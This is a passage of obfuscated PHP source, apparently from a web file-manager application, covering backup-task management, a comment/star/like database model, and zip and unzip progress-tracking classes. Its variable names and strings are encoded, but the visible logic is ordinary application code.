kill($ı¤˜°Éú) { $ÇÏ»©õ¨ =& $_SERVER[´‹ô¯Œ]; $§á¿¾‹ = $this->listData($ı¤˜°Éú); if (!$§á¿¾‹ || empty($§á¿¾‹[$ÇÏ»©õ¨[32]])) { return !0; } Task::kill($ÇÏ»©õ¨[871]); Task::kill($ÇÏ»©õ¨[890]); Task::kill($ÇÏ»©õ¨[900]); $ßá’ÉÙ¤ = $§á¿¾‹[$ÇÏ»©õ¨[32]]; $ïùÆ¡œÔ = TEMP_FILES . $ÇÏ»©õ¨[866] . $ßá’ÉÙ¤ . $ÇÏ»©õ¨[8]; IO::remove($ïùÆ¡œÔ, !1); return $this->remove($ı¤˜°Éú); } public function remove($œÒ£»¡ ) { $…Šüşáõ = $this->listData($œÒ£»¡ ); if (!$…Šüşáõ) { return !0; } return $this->backupRemove($…Šüşáõ); } private function backupRemove($œáÅÏãş) { parent::remove($œáÅÏãş[$_SERVER[´‹ô¯Œ][487]]); $øÔÌæÜÑ = $this->backupPath($œáÅÏãş); IO::remove($øÔÌæÜÑ, !1); return !0; } private function backupPath($™ò¯”²Û) { $¸éõÅ =& $_SERVER[´‹ô¯Œ]; $É—õƒšé = $™ò¯”²Û[$¸éõÅ[32]]; $Ğ×‹ÊôÛ = Model($¸éõÅ[856])->get($¸éõÅ[857]); $ÁÁ—¿â¼ = substr(md5($¸éõÅ[858] . $Ğ×‹ÊôÛ . $É—õƒšé), 0, 8); return "\x7b\151\x6f\72{$™ò¯”²Û[$¸éõÅ[838]]}\x7d\57\144\x61\x74\x61\x62\141\x73\x65\57\x62\141\x63\x6b\x75\160\57" . $É—õƒšé . $¸éõÅ[11] . $ÁÁ—¿â¼; } public function start() { $£ØÍå‰¬ =& $_SERVER[´‹ô¯Œ]; if ($GLOBALS[$£ØÍå‰¬[6]][$£ØÍå‰¬[92]][$£ØÍå‰¬[2024]] != $£ØÍå‰¬[91]) { return !0; } $üşóÅŒ = $this->config(); if (!$üşóÅŒ || $üşóÅŒ[$£ØÍå‰¬[1765]] != $£ØÍå‰¬[91]) { return !1; } if ($üşóÅŒ[$£ØÍå‰¬[171]] == $£ØÍå‰¬[862]) { $‘Şû‰œª = Model($£ØÍå‰¬[856])->get($£ØÍå‰¬[1341]); if ($‘Şû‰œª == $£ØÍå‰¬[1342]) { $üşóÅŒ[$£ØÍå‰¬[171]] = $£ØÍå‰¬[1224]; } } $üı´£—Ğ = $this->process(); foreach ($üı´£—Ğ as $ãÍ¦½˜Ô) { if ($ãÍ¦½˜Ô) { return Task::restart($ãÍ¦½˜Ô[$£ØÍå‰¬[487]]); } } $¸şÃ = new Backup(); $½Û™´Ëé = $¸şÃ->db(); if ($½Û™´Ëé) { $½Û™´Ëé = $¸şÃ->dbFile(); if ($½Û™´Ëé && $üşóÅŒ[$£ØÍå‰¬[171]] == $£ØÍå‰¬[862]) { $½Û™´Ëé = $¸şÃ->file(); } } Backup::set(array($£ØÍå‰¬[836] => 1, $£ØÍå‰¬[847] => time())); return !0; } public function process() { $¦êØêÕ£ =& $_SERVER[´‹ô¯Œ]; $ŞÒæš‡ğ = array($¦êØêÕ£[843] => Task::get($¦êØêÕ£[871]), $¦êØêÕ£[848] => Task::get($¦êØêÕ£[890]), $¦êØêÕ£[233] => Task::get($¦êØêÕ£[900])); $µîÊôŒ¨ = !1; foreach ($ŞÒæš‡ğ as &$ƒÖêšÇ) { if ($µîÊôŒ¨) { $ƒÖêšÇ = !1; continue; } if ($ƒÖêšÇ) { $¢é’µÒÖ = intval(_get($ƒÖêšÇ, $¦êØêÕ£[1801], 0)); if (time() - $¢é’µÒÖ > 7200) { Task::kill($ƒÖêšÇ[$¦êØêÕ£[487]]); $µîÊôŒ¨ = !0; $ƒÖêšÇ = !1; } } } return $ŞÒæš‡ğ; } public function restore() { $ö¥îâ“ş =& $_SERVER[´‹ô¯Œ]; ActionCall($ö¥îâ“ş[1152], !0, 1); ActionCall($ö¥îâ“ş[1152], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\145\x6e\164"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\x65" => "\x63\x6f\155\155\x65\x6e\164\137\155\145\x74\x61", "\155\145\164\141\106\151\x65\x6c\144" => "\143\157\x6d\x6d\x65\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($©ëÓô›Ç) { $ı²Æ•¬ =& $_SERVER[´‹ô¯Œ]; if ($©ëÓô›Ç[$ı²Æ•¬[2025]]) { $¶ÒÁÓÓô = $this->where(array($ı²Æ•¬[2026] => $©ëÓô›Ç[$ı²Æ•¬[2025]]))->find(); if (!$¶ÒÁÓÓô || $¶ÒÁÓÓô[$ı²Æ•¬[191]] != $©ëÓô›Ç[$ı²Æ•¬[191]] || $¶ÒÁÓÓô[$ı²Æ•¬[583]] != $©ëÓô›Ç[$ı²Æ•¬[583]]) { return !1; } $this->where(array($ı²Æ•¬[2026] => $©ëÓô›Ç[$ı²Æ•¬[2025]]))->setAdd($ı²Æ•¬[2027], 1); } $©ëÓô›Ç[$ı²Æ•¬[2028]] = 0; $©ëÓô›Ç[$ı²Æ•¬[2027]] = 0; $©ëÓô›Ç[$ı²Æ•¬[836]] = 1; return $this->add($©ëÓô›Ç); } public function commentCount($œò³“åì, $ÁõŞŒğÀ, $ŸŒÉ˜ÍÂ = false) { $ÄšàÄ­¾ =& $_SERVER[´‹ô¯Œ]; if (!$œò³“åì) { return array(); } if (is_string($œò³“åì) || is_int($œò³“åì)) { $œò³“åì = array($œò³“åì); } $ïõÅÃÛ‹ = array($ÄšàÄ­¾[583], $ÄšàÄ­¾[2029] => $ÄšàÄ­¾[579]); $Øáªë = array($ÄšàÄ­¾[583] => array($ÄšàÄ­¾[7], $œò³“åì), $ÄšàÄ­¾[191] => $ÁõŞŒğÀ); if ($ŸŒÉ˜ÍÂ) { $Øáªë[$ÄšàÄ­¾[1796]] = $ŸŒÉ˜ÍÂ; } $¡áĞ¶À‰ = $this->field($ïõÅÃÛ‹)->where($Øáªë)->group($ÄšàÄ­¾[583])->select(); return array_to_keyvalue($¡áĞ¶À‰, $ÄšàÄ­¾[583], $ÄšàÄ­¾[579]); } public function starTarget($Šµúùî, $ÛÇ¢àºÕ) { $šµïƒ› =& $_SERVER[´‹ô¯Œ]; $ùó†ÉÛŠ = $Šµúùî + self::TYPE_STAR_OFFSET; $”Ğ¶Ê©­ = array($šµïƒ›[1796] => USER_ID, $šµïƒ›[191] => $ùó†ÉÛŠ, $šµïƒ›[583] => $ÛÇ¢àºÕ); $å«Ç³ªî = $this->where($”Ğ¶Ê©­)->find(); if ($å«Ç³ªî) { return $this->where(array($šµïƒ›[487] => $å«Ç³ªî[$šµïƒ›[487]]))->delete(); } $Ù­–ÒÈè = array($šµïƒ›[2025] => 0, $šµïƒ›[1796] => USER_ID, $šµïƒ›[836] => 1, $šµïƒ›[171] => $šµïƒ›[12], $šµïƒ›[191] => $ùó†ÉÛŠ, $šµïƒ›[583] => $ÛÇ¢àºÕ, $šµïƒ›[2028] => 0, $šµïƒ›[2027] => 0); return $this->add($Ù­–ÒÈè); } public function starTargetCount($—˜’ç¥›, $÷½Øí) { $—šÀ³Œâ =& $_SERVER[´‹ô¯Œ]; $àÉÛÍá = $÷½Øí + self::TYPE_STAR_OFFSET; $Æ–ÃÉ«× = $this->commentCount($—˜’ç¥›, $àÉÛÍá); $ÈÎòœ½÷ = $this->commentCount($—˜’ç¥›, $àÉÛÍá, USER_ID); return array($—šÀ³Œâ[2030] => $Æ–ÃÉ«×, $—šÀ³Œâ[2031] => $ÈÎòœ½÷); } public function starTargetUserList($ãÎî¥ï, $Ç®•Ë¢›) { $ÉŒ±¬åÊ =& $_SERVER[´‹ô¯Œ]; $’ò¶ü´ = $ãÎî¥ï + self::TYPE_STAR_OFFSET; $Õæ„éŠ = array($ÉŒ±¬åÊ[583] => $Ç®•Ë¢›, $ÉŒ±¬åÊ[191] => $’ò¶ü´); $ëÊóş¤ = $this->where($Õæ„éŠ)->count(); $ ¬Ñ…èÄ = array($ÉŒ±¬åÊ[335] => $ëÊóş¤, $ÉŒ±¬åÊ[2032] => array()); if (!$ëÊóş¤) { return $ ¬Ñ…èÄ; } $¯Ğ®¡•Ë = $this->field($ÉŒ±¬åÊ[1796])->where($Õæ„éŠ)->limit(500)->select(); $¯Ğ®¡•Ë = array_to_keyvalue($¯Ğ®¡•Ë, $ÉŒ±¬åÊ[12], $ÉŒ±¬åÊ[1796]); $ ¬Ñ…èÄ[$ÉŒ±¬åÊ[2032]] = Model($ÉŒ±¬åÊ[591])->userListInfo($¯Ğ®¡•Ë); return $ ¬Ñ…èÄ; } public function prasiseUserList($¿§ªª‰½) { $ï­ÎÚ‹Á =& $_SERVER[´‹ô¯Œ]; $†úˆÍ¼ü = array($ï­ÎÚ‹Á[2033] => $¿§ªª‰½); $•ÛƒğŞ¨ = $this->where($†úˆÍ¼ü)->find(); $ÍˆÙïÆ = _get($•ÛƒğŞ¨, $ï­ÎÚ‹Á[2028], 0); $¬´Ë³Ùº = array($ï­ÎÚ‹Á[335] => $ÍˆÙïÆ, $ï­ÎÚ‹Á[2032] => array()); if (!$ÍˆÙïÆ) { return $¬´Ë³Ùº; } $œ˜°ïêØ = Model($ï­ÎÚ‹Á[2034])->field($ï­ÎÚ‹Á[1796])->where($†úˆÍ¼ü)->limit(500)->select(); $œ˜°ïêØ = array_to_keyvalue($œ˜°ïêØ, $ï­ÎÚ‹Á[12], $ï­ÎÚ‹Á[1796]); $¬´Ë³Ùº[$ï­ÎÚ‹Á[2032]] = Model($ï­ÎÚ‹Á[591])->userListInfo($œ˜°ïêØ); return $¬´Ë³Ùº; } public function remove($ÓûÁ€¤Ë) { $¼‚¢ƒäµ =& $_SERVER[´‹ô¯Œ]; $‹ËŒí˜á = array($¼‚¢ƒäµ[2026] => $ÓûÁ€¤Ë); $¨ä²åíÁ = $this->where($‹ËŒí˜á)->find(); if ($¨ä²åíÁ[$¼‚¢ƒäµ[2025]]) { $this->where(array($¼‚¢ƒäµ[2026] => $¨ä²åíÁ[$¼‚¢ƒäµ[2025]]))->setAdd($¼‚¢ƒäµ[2027], -1); } return $this->where($‹ËŒí˜á)->delete(); } public function edit($ú°Ä­, $¾šĞ°Å×) { $¼¼ş•ø =& $_SERVER[´‹ô¯Œ]; $îì¢ŒÖÙ = array($¼¼ş•ø[2026] => $ú°Ä­); return $this->where($îì¢ŒÖÙ)->save(array($¼¼ş•ø[2035] => $¾šĞ°Å×)); } public function prasise($Ó¤¸ü•ó) { $ÛËªÆşï =& $_SERVER[´‹ô¯Œ]; $ùÊ¼İ‹ñ = Model($ÛËªÆşï[2036]); $¾—ÓñíÎ = array($ÛËªÆşï[2026] => $Ó¤¸ü•ó, $ÛËªÆşï[1787] => USER_ID); $™ßíÁÒá = $ùÊ¼İ‹ñ->where($¾—ÓñíÎ)->find(); if (!$™ßíÁÒá) { $ùÊ¼İ‹ñ->add($¾—ÓñíÎ); $º¯”Íè = $this->where(array($ÛËªÆşï[2026] => $Ó¤¸ü•ó))->setAdd($ÛËªÆşï[2028], 1); } else { $ùÊ¼İ‹ñ->where($¾—ÓñíÎ)->delete(); $º¯”Íè = $this->where(array($ÛËªÆşï[2026] => $Ó¤¸ü•ó))->setAdd($ÛËªÆşï[2028], -1); } return $º¯”Íè; } public function targetInfo($‹ºÌÚ…š, $îêàÏ¤Å) { $ĞÇ½Üø =& $_SERVER[´‹ô¯Œ]; $„‘’Ï¼Ë = array($ĞÇ½Üø[665] => $‹ºÌÚ…š, $ĞÇ½Üø[666] => $îêàÏ¤Å); $œ£Œ­© = $this->where($„‘’Ï¼Ë)->count(); $ìÏŸÑŞ¸ = "\x52\111\107\110\124\x20\112\117\x49\116\40{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\164\x5f\x70\x72\141\151\x73\x65\x20\163\164\141\x72\x20\x6f\x6e\x20\143\x6f\155\155\x65\x6e\x74\56\x63\157\155\155\145\x6e\x74\x49\104\x20\75\x20\163\164\x61\x72\56\x63\x6f\155\155\x65\156\x74\x49\104"; $çÉúß¸± = $this->alias($ĞÇ½Üø[432])->where($„‘’Ï¼Ë)->join($ìÏŸÑŞ¸, $ĞÇ½Üø[2037])->count(); $¾Œ£‘¼ = array($ĞÇ½Üø[2038] => $œ£Œ­©, $ĞÇ½Üø[2039] => $çÉúß¸±); return $¾Œ£‘¼; } public function listData($Ì¥œì™–) { $…œå™Â =& $_SERVER[´‹ô¯Œ]; if (isset($Ì¥œì™–[$…œå™Â[2040]])) { if ($Ì¥œì™–[$…œå™Â[2040]]) { $Ì¥œì™–[$…œå™Â[2033]] = array($…œå™Â[1106], intval($Ì¥œì™–[$…œå™Â[2040]])); } unset($Ì¥œì™–[$…œå™Â[2040]]); } if (isset($Ì¥œì™–[$…œå™Â[2041]])) { if ($Ì¥œì™–[$…œå™Â[2041]]) { $Ì¥œì™–[$…œå™Â[2033]] = array($…œå™Â[1103], intval($Ì¥œì™–[$…œå™Â[2041]])); } unset($Ì¥œì™–[$…œå™Â[2041]]); } return $this->_listData($Ì¥œì™–); } private function _listData($ş‘À÷Ä) { $ñ¦çêœ… =& $_SERVER[´‹ô¯Œ]; $È­ÛÈÂø = $this->where($ş‘À÷Ä)->_makeOrder()->selectPage(100); $this->_listAppendParent($È­ÛÈÂø[$ñ¦çêœ…[448]]); $this->_listAppendUser($È­ÛÈÂø[$ñ¦çêœ…[448]]); $this->_listAppendMeta($È­ÛÈÂø[$ñ¦çêœ…[448]]); return $È­ÛÈÂø; } private function _makeOrder() { $Æà®ï¡ =& $_SERVER[´‹ô¯Œ]; $º„óïäŞ = array($Æà®ï¡[2028], $Æà®ï¡[2027], $Æà®ï¡[234]); $±¾¦»‡¿ = Input::get($Æà®ï¡[542], $Æà®ï¡[7], $Æà®ï¡[509], $º„óïäŞ); $½¬á¸ê÷ = Input::get($Æà®ï¡[543], $Æà®ï¡[7], $Æà®ï¡[1789], array($Æà®ï¡[2042], $Æà®ï¡[538])); $õ™Ï¸Í² = $±¾¦»‡¿ . $Æà®ï¡[53] . $½¬á¸ê÷; return $this->order($õ™Ï¸Í²); } private function _listAppendParent(&$öìúŒÁ) { $À’ØÕäì =& $_SERVER[´‹ô¯Œ]; $Å­·¯ÜÅ = array_unique(array_to_keyvalue($öìúŒÁ, $À’ØÕäì[12], $À’ØÕäì[2025])); $Å­·¯ÜÅ = array_remove_value($Å­·¯ÜÅ, $À’ØÕäì[231]); if (!$Å­·¯ÜÅ) { return; } $Ğ–¥Éû = $this->where(array($À’ØÕäì[2026] => array($À’ØÕäì[7], $Å­·¯ÜÅ)))->select(); $Ğ–¥Éû = array_to_keyvalue($Ğ–¥Éû, $À’ØÕäì[2033]); foreach ($öìúŒÁ as &$„±ê­€•) { if (isset($Ğ–¥Éû[$„±ê­€•[$À’ØÕäì[2025]]])) { $„±ê­€•[$À’ØÕäì[2043]] = $Ğ–¥Éû[$„±ê­€•[$À’ØÕäì[2025]]]; } } unset($„±ê­€•); } private function _listAppendUser(&$Ñ÷ú“ÙÖ) { $ÉÇÅœ’Ã =& $_SERVER[´‹ô¯Œ]; $ÙÌÕê÷¤ = array_unique(array_to_keyvalue($Ñ÷ú“ÙÖ, $ÉÇÅœ’Ã[12], $ÉÇÅœ’Ã[1796])); $ÙÌÕê÷¤ = array_remove_value($ÙÌÕê÷¤, $ÉÇÅœ’Ã[231]); if (count($ÙÌÕê÷¤) == 0) { return; } foreach ($Ñ÷ú“ÙÖ as $µÒ‰Á¹Í) { if (isset($µÒ‰Á¹Í[$ÉÇÅœ’Ã[2043]])) { $ÙÌÕê÷¤[] = $µÒ‰Á¹Í[$ÉÇÅœ’Ã[2043]][$ÉÇÅœ’Ã[1796]]; } } $µ¬ÍãŒÚ = Model($ÉÇÅœ’Ã[611])->userListInfo($ÙÌÕê÷¤); foreach ($Ñ÷ú“ÙÖ as &$µÒ‰Á¹Í) { $µÒ‰Á¹Í[$ÉÇÅœ’Ã[679]] = $µ¬ÍãŒÚ[$µÒ‰Á¹Í[$ÉÇÅœ’Ã[1796]]]; if (isset($µÒ‰Á¹Í[$ÉÇÅœ’Ã[2043]])) { $µÒ‰Á¹Í[$ÉÇÅœ’Ã[2043]][$ÉÇÅœ’Ã[679]] = $µ¬ÍãŒÚ[$µÒ‰Á¹Í[$ÉÇÅœ’Ã[2043]][$ÉÇÅœ’Ã[1796]]]; } } unset($µÒ‰Á¹Í); } private function _listAppendMeta(&$´±÷”µ„) { $ÀŒïˆ„ó =& $_SERVER[´‹ô¯Œ]; $”‰Ù‚ŒÓ = array_unique(array_to_keyvalue($´±÷”µ„, $ÀŒïˆ„ó[12], $ÀŒïˆ„ó[2033])); $”‰Ù‚ŒÓ = array_remove_value($”‰Ù‚ŒÓ, $ÀŒïˆ„ó[231]); if (!$”‰Ù‚ŒÓ) { return; } foreach ($´±÷”µ„ as $úØë…÷Î) { if (isset($úØë…÷Î[$ÀŒïˆ„ó[2043]])) { $”‰Ù‚ŒÓ[] = $úØë…÷Î[$ÀŒïˆ„ó[2043]][$ÀŒïˆ„ó[2033]]; } } $¶˜˜Ù»Ş = $this->metaList($”‰Ù‚ŒÓ); if (!$¶˜˜Ù»Ş) { return !1; } foreach ($´±÷”µ„ as &$úØë…÷Î) { $úØë…÷Î[$ÀŒïˆ„ó[553]] = $¶˜˜Ù»Ş[$úØë…÷Î[$ÀŒïˆ„ó[2033]]]; if (isset($úØë…÷Î[$ÀŒïˆ„ó[2043]])) { $úØë…÷Î[$ÀŒïˆ„ó[2043]][$ÀŒïˆ„ó[553]] = $¶˜˜Ù»Ş[$úØë…÷Î[$ÀŒïˆ„ó[2043]][$ÀŒïˆ„ó[2033]]]; } } unset($úØë…÷Î); } private function metaList($ÍÍÀ‚ÔÌ) { $ç•î¸Æ˜ =& $_SERVER[´‹ô¯Œ]; if (!$ÍÍÀ‚ÔÌ) { return array(); } $Ø¬Œøï˜ = array($ç•î¸Æ˜[2033] => array($ç•î¸Æ˜[7], $ÍÍÀ‚ÔÌ)); $îÉÉÄ«§ = Model($ç•î¸Æ˜[2044])->where($Ø¬Œøï˜)->select(); $îÉÉÄ«§ = array_to_keyvalue_group($îÉÉÄ«§, $ç•î¸Æ˜[2033]); foreach ($îÉÉÄ«§ as $ûä™¸¯‚ => $¶Ç¹´„ê) { $…¿Éô×‚ = array(); foreach ($¶Ç¹´„ê as $ÉÄ§¿¤) { $…¿Éô×‚[$ÉÄ§¿¤[$ç•î¸Æ˜[97]]] = $ÉÄ§¿¤[$ç•î¸Æ˜[453]]; } $îÉÉÄ«§[$ûä™¸¯‚] = $…¿Éô×‚; } return $îÉÉÄ«§ ? $îÉÉÄ«§ : array(); } public function removeTarget($æœÅ¡Ûô, $–ßé›ÚÑ) { $òá‰ˆÆ· =& $_SERVER[´‹ô¯Œ]; if (!$–ßé›ÚÑ) { return !0; } $–ßé›ÚÑ = is_array($–ßé›ÚÑ) ? $–ßé›ÚÑ : array($–ßé›ÚÑ); $ÅÔ ¸ôË = array($òá‰ˆÆ·[191] => $æœÅ¡Ûô, $òá‰ˆÆ·[583] => array($òá‰ˆÆ·[7], $–ßé›ÚÑ)); $™‚ıî“­ = $this->field($òá‰ˆÆ·[2033])->where($ÅÔ ¸ôË)->select(); $ğó×Šà = array_to_keyvalue($™‚ıî“­, $òá‰ˆÆ·[12], $òá‰ˆÆ·[2033]); if (!$ğó×Šà) { return !0; } $ÅÔ ¸ôË = array($òá‰ˆÆ·[2033] => array($òá‰ˆÆ·[7], $ğó×Šà)); $this->where($ÅÔ ¸ôË)->delete(); Model($òá‰ˆÆ·[2036])->where($ÅÔ ¸ôË)->delete(); Model($òá‰ˆÆ·[2045])->where($ÅÔ ¸ôË)->delete(); } } goto e³ŠÈ¤´Ñ; BËÇØ›’ì§: define($_SERVER[´‹ô¯Œ][320], 3); define($_SERVER[´‹ô¯Œ][321], 1); define($_SERVER[´‹ô¯Œ][322], 0); goto AÎ£®ŒË; eÍ¦ÑêŒ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ûÅ’ÅûÖ =& $_SERVER[´‹ô¯Œ]; parent::startAfter(); Hook::bind($ûÅ’ÅûÖ[1911], array($this, $ûÅ’ÅûÖ[1912])); Hook::bind($ûÅ’ÅûÖ[1295], array($this, $ûÅ’ÅûÖ[1913])); Hook::bind($ûÅ’ÅûÖ[1914], array($this, $ûÅ’ÅûÖ[1915])); $ï–Ÿô©« =& $this->task; $ï–Ÿô©«[$ûÅ’ÅûÖ[1916]] = $ûÅ’ÅûÖ[1296]; if (!$ï–Ÿô©«[$ûÅ’ÅûÖ[1684]]) { $ï–Ÿô©«[$ûÅ’ÅûÖ[1684]] = LNG($ûÅ’ÅûÖ[1917]); } } protected function endAfter() { $Åö©ÀÔÒ =& $_SERVER[´‹ô¯Œ]; parent::endAfter(); Hook::unbind($Åö©ÀÔÒ[1911], array($this, $Åö©ÀÔÒ[1912])); Hook::unbind($Åö©ÀÔÒ[1295], array($this, $Åö©ÀÔÒ[1913])); Hook::unbind($Åö©ÀÔÒ[1914], array($this, $Åö©ÀÔÒ[1915])); } public function updateAfter() { $œöåÇ¡ =& $_SERVER[´‹ô¯Œ]; $”äë†ñ =& $this->task; if (!$”äë†ñ[$œöåÇ¡[1155]] || !$”äë†ñ[$œöåÇ¡[849]]) { if ($”äë†ñ[$œöåÇ¡[1916]] != $œöåÇ¡[391]) { return; } } if ($”äë†ñ[$œöåÇ¡[1916]] == $œöåÇ¡[1296]) { $ã½Õ¨øÆ = 0; if ($”äë†ñ[$œöåÇ¡[1850]]) { $ã½Õ¨øÆ = $”äë†ñ[$œöåÇ¡[1851]] / $”äë†ñ[$œöåÇ¡[1850]]; } $”äë†ñ[$œöåÇ¡[1798]] = $ã½Õ¨øÆ * 0.3; } else { if ($”äë†ñ[$œöåÇ¡[1916]] == $œöåÇ¡[391]) { $ã½Õ¨øÆ = $”äë†ñ[$œöåÇ¡[1797]] / $”äë†ñ[$œöåÇ¡[1155]]; $”äë†ñ[$œöåÇ¡[1798]] = 0.3 + $ã½Õ¨øÆ * 0.4; } else { if ($”äë†ñ[$œöåÇ¡[1916]] == $œöåÇ¡[110]) { $†­¾ÆÍ³ = 0; if ($”äë†ñ[$œöåÇ¡[1852]] == $œöåÇ¡[110]) { $†­¾ÆÍ³ = $”äë†ñ[$œöåÇ¡[1851]]; } $ã½Õ¨øÆ = ($”äë†ñ[$œöåÇ¡[1855]] + $†­¾ÆÍ³) / $”äë†ñ[$œöåÇ¡[849]]; $”äë†ñ[$œöåÇ¡[1798]] = 0.3 + 0.4 + $ã½Õ¨øÆ * 0.3; } } } if ($”äë†ñ[$œöåÇ¡[1798]] > 0) { $³¦‰üºö = timeFloat() - $”äë†ñ[$œöåÇ¡[1800]] - $”äë†ñ[$œöåÇ¡[1803]]; $”äë†ñ[$œöåÇ¡[1804]] = $³¦‰üºö * (1 - $”äë†ñ[$œöåÇ¡[1798]]) / $”äë†ñ[$œöåÇ¡[1798]]; } } public function addFile($´èÍÚõ¿) { $Å¡Àå…Î =& $_SERVER[´‹ô¯Œ]; $–˜ïê…ñ =& $this->task; $¿ºêÃëñ = IO::info($´èÍÚõ¿); $–˜ïê…ñ[$Å¡Àå…Î[1848]] = $¿ºêÃëñ[$Å¡Àå…Î[32]]; $–˜ïê…ñ[$Å¡Àå…Î[1850]] = $¿ºêÃëñ[$Å¡Àå…Î[79]]; $–˜ïê…ñ[$Å¡Àå…Î[1851]] = 0; $–˜ïê…ñ[$Å¡Àå…Î[1157]] = $Å¡Àå…Î[1871]; $–˜ïê…ñ[$Å¡Àå…Î[1852]] = $Å¡Àå…Î[1296]; $–˜ïê…ñ[$Å¡Àå…Î[849]] = $¿ºêÃëñ[$Å¡Àå…Î[79]]; $–˜ïê…ñ[$Å¡Àå…Î[1155]] = 1; $¡ëí¼ˆÑ = 0; $–˜ïê…ñ[$Å¡Àå…Î[1859]] = array($Å¡Àå…Î[1860] => $¡ëí¼ˆÑ + 1, $Å¡Àå…Î[506] => $¿ºêÃëñ[$Å¡Àå…Î[32]], $Å¡Àå…Î[87] => $¿ºêÃëñ[$Å¡Àå…Î[87]], $Å¡Àå…Î[596] => $¿ºêÃëñ[$Å¡Àå…Î[596]] ? $¿ºêÃëñ[$Å¡Àå…Î[596]] : $¿ºêÃëñ[$Å¡Àå…Î[87]]); $this->update(); } public function zipEvent($„½ó°, $½ÕæÂåˆ, $¼îÏ¦Ñº, $‹Êø™š³) { $«•Á§¤” =& $_SERVER[´‹ô¯Œ]; $áÁ¥È¾¸ =& $this->task; $áÁ¥È¾¸[$«•Á§¤”[1848]] = get_path_this($½ÕæÂåˆ); $áÁ¥È¾¸[$«•Á§¤”[1850]] = $‹Êø™š³; $áÁ¥È¾¸[$«•Á§¤”[1851]] = $¼îÏ¦Ñº; $áÁ¥È¾¸[$«•Á§¤”[1157]] = $„½ó° == $«•Á§¤”[1918] ? $«•Á§¤”[1919] : $«•Á§¤”[1920]; $áÁ¥È¾¸[$«•Á§¤”[1852]] = $«•Á§¤”[12]; $áÁ¥È¾¸[$«•Á§¤”[849]] = $‹Êø™š³; $áÁ¥È¾¸[$«•Á§¤”[1916]] = $«•Á§¤”[391]; $this->update(); } public function unzipAfter($”«Ü×¥¯) { $¥ÎéĞ‡ =& $_SERVER[´‹ô¯Œ]; $ö›şúÜ— =& $this->task; $ö›şúÜ—[$¥ÎéĞ‡[1916]] = $¥ÎéĞ‡[110]; $¦”É÷±Ù = IO::infoWithChildren($”«Ü×¥¯); $±«öË­ = 0; $ö›şúÜ—[$¥ÎéĞ‡[1859]] = array($¥ÎéĞ‡[1860] => $±«öË­ + 1, $¥ÎéĞ‡[506] => $¦”É÷±Ù[$¥ÎéĞ‡[32]], $¥ÎéĞ‡[87] => $¦”É÷±Ù[$¥ÎéĞ‡[87]], $¥ÎéĞ‡[596] => $¦”É÷±Ù[$¥ÎéĞ‡[596]] ? $¦”É÷±Ù[$¥ÎéĞ‡[596]] : $¦”É÷±Ù[$¥ÎéĞ‡[87]]); if ($¦”É÷±Ù[$¥ÎéĞ‡[33]] == $¥ÎéĞ‡[233]) { $ö›şúÜ—[$¥ÎéĞ‡[1155]] = 1; } else { $ö›şúÜ—[$¥ÎéĞ‡[1155]] = $¦”É÷±Ù[$¥ÎéĞ‡[82]][$¥ÎéĞ‡[80]]; } $ö›şúÜ—[$¥ÎéĞ‡[1157]] = $¥ÎéĞ‡[12]; $ö›şúÜ—[$¥ÎéĞ‡[1852]] = 0; $ö›şúÜ—[$¥ÎéĞ‡[1797]] = 0; $ö›şúÜ—[$¥ÎéĞ‡[1850]] = 0; $ö›şúÜ—[$¥ÎéĞ‡[1851]] = 0; $ö›şúÜ—[$¥ÎéĞ‡[1848]] = $¥ÎéĞ‡[12]; $ö›şúÜ—[$¥ÎéĞ‡[1855]] = 0; $ö›şúÜ—[$¥ÎéĞ‡[849]] = $¦”É÷±Ù[$¥ÎéĞ‡[79]]; $this->update(); self::log($¥ÎéĞ‡[1921] . json_encode(array($ö›şúÜ—, $¦”É÷±Ù))); } public function nameParse($Ùƒß­è) { $¡³ó¡õ‰ =& $_SERVER[´‹ô¯Œ]; $Ñ¯Ÿš¥“ =& $this->task; if ($Ñ¯Ÿš¥“[$¡³ó¡õ‰[1916]] == $¡³ó¡õ‰[1296]) { $Ñ¯Ÿš¥“[$¡³ó¡õ‰[1916]] = $¡³ó¡õ‰[391]; $Ñ¯Ÿš¥“[$¡³ó¡õ‰[1855]] = 0; $Ñ¯Ÿš¥“[$¡³ó¡õ‰[849]] = 0; } $§à®ˆ İ = get_path_this($Ùƒß­è); if (strstr($§à®ˆ İ, $¡³ó¡õ‰[10])) { $Ñ¯Ÿš¥“[$¡³ó¡õ‰[1797]] += 1; $Ñ¯Ÿš¥“[$¡³ó¡õ‰[1155]] += 1; } $Ñ¯Ÿš¥“[$¡³ó¡õ‰[1848]] = $Ùƒß­è; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ûİÌğöÀ =& $_SERVER[´‹ô¯Œ]; parent::startAfter(); Hook::bind($ûİÌğöÀ[1922], array($this, $ûİÌğöÀ[1912])); Hook::bind($ûİÌğöÀ[1914], array($this, $ûİÌğöÀ[1915])); $¥‹ã›Ò² =& $this->task; $¥‹ã›Ò²[$ûİÌğöÀ[1916]] = $ûİÌğöÀ[1296]; if (!$¥‹ã›Ò²[$ûİÌğöÀ[1684]]) { $¥‹ã›Ò²[$ûİÌğöÀ[1684]] = LNG($ûİÌğöÀ[1923]); } } protected function endAfter() { $óÍ½‚¶ =& $_SERVER[´‹ô¯Œ]; parent::endAfter(); Hook::unbind($óÍ½‚¶[1922], array($this, $óÍ½‚¶[1912])); Hook::unbind($óÍ½‚¶[1914], array($this, $óÍ½‚¶[1915])); } public function updateAfter() { $Ûè”¨Ú¦ =& $_SERVER[´‹ô¯Œ]; $µÈĞˆ…Ù =& $this->task; if (!$µÈĞˆ…Ù[$Ûè”¨Ú¦[1155]] || !$µÈĞˆ…Ù[$Ûè”¨Ú¦[849]]) { return; } if ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1916]] == $Ûè”¨Ú¦[1296]) { $¿ßå­Òë = $µÈĞˆ…Ù[$Ûè”¨Ú¦[1851]]; if ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1852]] != $Ûè”¨Ú¦[1296]) { 